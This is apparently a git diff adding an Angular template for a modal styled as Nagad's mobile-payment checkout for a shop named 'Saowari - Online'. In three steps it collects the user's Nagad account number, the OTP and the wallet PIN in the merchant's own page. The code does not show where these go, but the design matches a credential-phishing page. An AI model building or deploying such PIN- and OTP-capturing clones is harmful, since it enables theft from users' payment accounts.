@@ -1,0 +1,107 @@
+<div class="fixed inset-0 z-[10000] flex items-center justify-center bg-black/60 backdrop-blur-sm">
+  <!-- Main Modal Container -->
+  <div class="bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-[#e31019] to-[#8a0a0f] w-full max-w-sm rounded shadow-2xl overflow-hidden flex flex-col font-sans text-white border-2 border-[#1a1a1a]">
+    
+    <!-- Top Bar with Lang Toggle -->
+    <div class="flex justify-end p-3">
+      <div class="flex rounded border border-white/50 text-xs overflow-hidden cursor-pointer">
+        <button (click)="toggleLang('bn')" [ngClass]="lang === 'bn' ? 'bg-[#e31019] border-r border-white/50 font-bold' : 'bg-transparent text-white/70 hover:text-white'" class="px-2 py-0.5 transition-colors">বাংলা</button>
+        <button (click)="toggleLang('en')" [ngClass]="lang === 'en' ? 'bg-[#e31019] border-l border-white/50 font-bold' : 'bg-transparent text-white/70 hover:text-white'" class="px-2 py-0.5 transition-colors">Eng</button>
+      </div>
+    </div>
+
+    <!-- Header Content -->
+    <div class="flex flex-col items-center pt-2 pb-6 px-6">
+      <div class="mb-3 text-5xl opacity-90 text-white flex gap-1">
+        <i class="fas fa-shopping-cart"></i>
+      </div>
+      <h2 class="text-xl font-bold mb-6">Saowari - Online</h2>
+      
+      <div class="w-full text-sm space-y-3 font-medium">
+        <div class="flex items-center">
+          <span class="w-32 text-white/90">{{ lang === 'en' ? 'Invoice No:' : 'ইনভয়েস নং:' }}</span>
+          <span>{{ invoiceNo }}</span>
+        </div>
+        <div class="flex items-center">
+          <span class="w-32 text-white/90">{{ lang === 'en' ? 'Total Amount:' : 'সর্বমোট পরিমাণ:' }}</span>
+          <span>BDT {{ amount | number:'1.2-2' }}</span>
+        </div>
+        <div class="flex items-center">
+          <span class="w-32 text-white/90">{{ lang === 'en' ? 'Charge:' : 'চার্জ:' }}</span>
+          <span>BDT 0</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Middle Interactive Section -->
+    <div class="px-6 py-8 flex flex-col items-center justify-center min-h-[220px]">
+      
+      <!-- STEP 1: Account Number -->
+      <div *ngIf="currentStep === 1" class="w-full text-center animate-fade-in">
+        <p class="mb-3 font-bold text-[15px]">{{ lang === 'en' ? 'Your Nagad Account Number' : 'আপনার নগদ একাউন্ট নম্বর' }}</p>
+        <div class="flex items-center justify-center gap-[2px] mb-4">
+          <ng-container *ngFor="let digit of accountDigits; let i = index; trackBy: trackByIndex">
+            <input type="tel" [id]="'account-' + i" [value]="accountDigits[i]"
+                   (input)="onDigitInput($event, i, 'account')"
+                   (keydown)="onDigitKeyDown($event, i, 'account')"
+                   class="w-6 h-8 text-center text-[#e31019] font-bold rounded focus:outline-none focus:ring-2 focus:ring-white/50 bg-white px-0" 
+                   maxlength="1">
+            <span *ngIf="i === 2 || i === 6" class="text-white font-bold mx-0.5">-</span>
+          </ng-container>
+        </div>
+        <p class="mt-4 text-[11px] text-white/90 leading-tight">
+          {{ lang === 'en' ? 'By clicking/tapping "Proceed" you are agreeing to our' : '"এগিয়ে যান" এ ক্লিক/ট্যাপ করার মাধ্যমে আপনি আমাদের' }} <span class="font-bold">{{ lang === 'en' ? 'Terms and Conditions' : 'শর্তাবলীতে' }}</span> {{ lang === 'bn' ? 'সম্মত হচ্ছেন' : '' }}
+        </p>
+      </div>
+
+      <!-- STEP 2: Verification Code -->
+      <div *ngIf="currentStep === 2" class="w-full text-center animate-fade-in">
+        <p class="mb-3 font-bold text-[15px]">{{ lang === 'en' ? 'Enter Verification Code [OTP]' : 'ভেরিফিকেশন কোড লিখুন [OTP]' }}</p>
+        <input type="text" [(ngModel)]="verificationCode" 
+               class="w-full text-center text-[#e31019] font-bold py-2 rounded text-xl tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-white/50 bg-white" 
+               placeholder="XXX XXX" maxlength="6">
+      </div>
+
+      <!-- STEP 3: PIN -->
+      <div *ngIf="currentStep === 3" class="w-full text-center animate-fade-in">
+        <p class="mb-3 font-bold text-[15px]">{{ lang === 'en' ? 'Enter PIN' : 'পিন নম্বর দিন' }}</p>
+        <div class="flex items-center justify-center gap-2 mb-4">
+          <ng-container *ngFor="let digit of pinDigits; let i = index; trackBy: trackByIndex">
+            <input type="password" [id]="'pin-' + i" [value]="pinDigits[i]"
+                   autocomplete="new-password"
+                   readonly onfocus="this.removeAttribute('readonly');"
+                   (input)="onDigitInput($event, i, 'pin')"
+                   (keydown)="onDigitKeyDown($event, i, 'pin')"
+                   class="w-10 h-10 text-center text-[#e31019] font-bold rounded text-2xl focus:outline-none focus:ring-2 focus:ring-white/50 bg-white" 
+                   maxlength="1">
+          </ng-container>
+        </div>
+      </div>
+
+      <!-- Buttons -->
+      <div class="flex gap-4 w-full mt-8 justify-center" [ngClass]="{'px-4': currentStep === 2}">
+        <button (click)="onConfirm()" [disabled]="isLoading" class="bg-white text-[#b9151b] font-bold py-2 px-6 rounded text-sm hover:bg-gray-100 transition-colors w-28 relative">
+          <span *ngIf="isLoading" class="loading loading-spinner loading-sm absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2"></span>
+          <span [class.opacity-0]="isLoading">{{ lang === 'en' ? 'Proceed' : 'প্রোসিড' }}</span>
+        </button>
+        
+        <button *ngIf="currentStep === 2" (click)="resendCode()" [disabled]="resendCountdown > 0" class="bg-white text-[#b9151b] font-bold py-2 px-2 rounded text-sm hover:bg-gray-100 transition-colors flex-1 disabled:opacity-80">
+          <span *ngIf="resendCountdown > 0" class="text-xs">{{ lang === 'en' ? 'Resend in' : 'পুনরায় পাঠান' }} {{ resendCountdown }}s</span>
+          <span *ngIf="resendCountdown <= 0">{{ lang === 'en' ? 'Resend Code' : 'পুনরায় কোড পাঠান' }}</span>
+        </button>
+
+        <button (click)="onCancel()" class="bg-white text-[#b9151b] font-bold py-2 px-6 rounded text-sm hover:bg-gray-100 transition-colors w-28">
+          {{ lang === 'en' ? 'Close' : 'ক্লোজ' }}
+        </button>
+      </div>
+
+    </div>
+
+    <!-- Bottom Logo Area -->
+    <div class="py-8 flex justify-center items-center">
+      <img *ngIf="logoUrl" [src]="logoUrl" alt="Nagad Logo" class="h-12 w-auto object-contain" />
+      <span *ngIf="!logoUrl" class="text-2xl font-bold tracking-tight">নগদ</span>
+    </div>
+
+  </div>
+</div>
